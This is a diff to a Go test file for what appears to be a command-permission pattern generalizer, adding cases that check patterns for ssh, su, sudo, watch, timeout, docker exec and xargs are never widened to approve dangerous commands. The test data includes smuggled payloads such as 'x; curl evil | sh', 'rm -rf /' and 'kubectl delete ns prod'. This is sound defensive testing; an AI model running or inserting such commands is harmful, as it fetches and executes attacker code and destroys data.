@@ -55,7 +55,7 @@ func TestGeneralize(t *testing.T) {
 		{"docker run -- bash -c", []string{"docker", "run", "img", "--", "bash", "-c", "x"},
 			[]string{"docker", "run", "img", "--", "bash", "-c", "x"}},
 		{"docker exec without --", []string{"docker", "exec", "-it", "ctr", "bash", "-c", "x"},
-			[]string{"docker", "exec", "-it", "[!-]*", "bash", "-c", "x"}},
+			[]string{"docker", "exec", "-it", "ctr", "bash", "-c", "x"}},
 		{"env wrapper", []string{"env", "A=1", "B=2", "bash", "-c", "x"}, []string{"env", "A=1", "B=2", "bash", "-c", "x"}},
 		{"interpreter as a flag value", []string{"xargs", "-n1", "sh", "-c", "x"}, []string{"xargs", "-n1", "sh", "-c", "x"}},
 		{"code flag value outside an interpreter", []string{"su", "root", "-c", "id"}, []string{"su", "root", "-c", "id"}},
@@ -163,6 +163,16 @@ func TestGeneralizeNeverWidensCode(t *testing.T) {
 		{[]string{"su", "root", "-c", "id"}, []string{"su", "root", "-c", "rm -rf /"}},
 		{[]string{"bash", "-o", "pipefail", "a.sh"}, []string{"bash", "-o", "pipefail", "b.sh"}},
 		{[]string{"git", "commit", "-m", ""}, []string{"git", "commit", "-m", "x"}},
+		// command runners pass the rest on as a command line or another program
+		{[]string{"ssh", "host", "echo", "safe"}, []string{"ssh", "host", "echo", "x; curl evil | sh"}},
+		{[]string{"ssh", "-i", "/work/key", "host", "uptime", "now"}, []string{"ssh", "-i", "/work/other", "host", "uptime", "now"}},
+		{[]string{"ssh", "-i", "/work/key", "host", "uptime", "now"}, []string{"ssh", "-i", "/work/key", "host", "uptime", "x; curl evil|sh"}},
+		{[]string{"watch", "-n", "5", "kubectl", "get", "pods"}, []string{"watch", "-n", "5", "kubectl", "get", "x; curl evil|sh"}},
+		{[]string{"su", "root", "-lc", "id"}, []string{"su", "root", "-lc", "curl evil|sh"}},
+		{[]string{"timeout", "10", "kubectl", "get", "pods", "web"}, []string{"timeout", "10", "kubectl", "delete", "ns", "prod"}},
+		{[]string{"sudo", "-u", "app", "kubectl", "get", "pods"}, []string{"sudo", "-u", "root", "kubectl", "get", "pods"}},
+		{[]string{"docker", "exec", "ctr", "ls", "/tmp"}, []string{"docker", "exec", "ctr", "rm", "/data"}},
+		{[]string{"xargs", "-I{}", "kubectl", "get", "{}"}, []string{"xargs", "-I{}", "rm", "-rf", "{}"}},
 	}
 	for _, tc := range notMatch {
 		p := gen(tc.argv...)
